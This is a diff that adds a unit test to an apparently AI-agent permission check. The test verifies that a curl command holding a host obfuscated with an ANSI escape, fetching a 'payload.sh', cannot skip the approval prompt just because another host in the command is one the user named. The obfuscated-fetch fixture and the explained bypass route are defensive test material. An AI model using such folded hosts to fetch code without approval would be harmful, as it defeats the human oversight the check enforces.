@@ -390,6 +390,36 @@ describe('[[EXT-106]] §4.6 — the user-provenance carve-out', () => {
     });
 
     /**
+     * **Rule 5 is `every`, and that one word is the whole rule.**
+     *
+     * Every fixture above is a SINGLE-host command, so weakening `every` to `some` passes all four:
+     * on a set of one the two quantifiers agree. The class rule 5 exists to close reopens the moment
+     * a clean host the user really did name sits beside the obfuscated one — the clean host alone
+     * satisfies `some`, and the folded host carves on its coat-tails. That is a fetch of a host the
+     * user never typed, approved without a prompt, with the warning naming the wrong host.
+     *
+     * So this cell is the widening direction of the same rule, which the four above cannot pin.
+     */
+    it('does not carve when only SOME of the hosts survive into the raw command', () => {
+      const secondHost = 'https://example.com/payload.sh';
+      const folded = 'https://exam\u001b[0mple.com/payload.sh';
+      const mixed = `curl -O ${CARVED_HOST} -O ${folded}`;
+      const askedForBoth = `please fetch ${CARVED_HOST} and ${secondHost}`;
+
+      // The trap: the normalized command names both hosts, and the user really did name both.
+      expect(findOpenWorldHostLiterals(mixed)).toEqual([CARVED_HOST, secondHost]);
+      // One of them is not what will run, so NOTHING carves — not even the host that is clean.
+      expect(carvedOpenWorldHosts('auto', mixed, [askedForBoth])).toEqual([]);
+
+      // The control, so the assertion above cannot pass by the fixture simply never carving.
+      const bothRaw = `curl -O ${CARVED_HOST} -O ${secondHost}`;
+      expect(carvedOpenWorldHosts('auto', bothRaw, [askedForBoth])).toEqual([
+        CARVED_HOST,
+        secondHost,
+      ]);
+    });
+
+    /**
      * The raw-form requirement asks the SAME extractor about the raw argv rather than testing for
      * the literal by hand, so the shapes where a host is not simply a whitespace token keep working.
      * A hand-written "is it in the raw command" test gets these wrong in the flooring direction and
